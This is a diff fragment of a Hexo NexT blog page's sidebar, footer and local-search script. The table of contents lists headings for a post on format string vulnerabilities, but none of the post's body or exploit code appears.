+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/actionyz" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:act01n@163.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.google.com" target="_blank" title="Google">
+                    
+                      <i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="1792034533" target="_blank" title="QQ">
+                    
+                      <i class="fa fa-fw fa-QQ"></i>QQ</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-漏洞简述"><span class="nav-number">1.</span> <span class="nav-text">0x01 漏洞简述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-简介"><span class="nav-number">1.1.</span> <span class="nav-text">0x1 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-产生条件"><span class="nav-number">1.2.</span> <span class="nav-text">0x2 产生条件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-内存读取"><span class="nav-number">2.</span> <span class="nav-text">0x02 内存读取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-printf-参数格式"><span class="nav-number">2.1.</span> <span class="nav-text">0x1 printf 参数格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-堆栈情况"><span class="nav-number">2.2.</span> <span class="nav-text">0x2 堆栈情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-实例分析"><span class="nav-number">2.3.</span> <span class="nav-text">0x3 实例分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1计算参数偏移个数"><span class="nav-number">2.3.1.</span> <span class="nav-text">1计算参数偏移个数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-gdb调试"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">(1) gdb调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-利用pwntools计算"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">(2) 利用pwntools计算</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2利用dynelf实现内存泄露"><span class="nav-number">2.3.2.</span> <span class="nav-text">2利用DynELF实现内存泄露</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-内存写入"><span class="nav-number">3.</span> <span class="nav-text">0x03 内存写入</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">4ct10n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
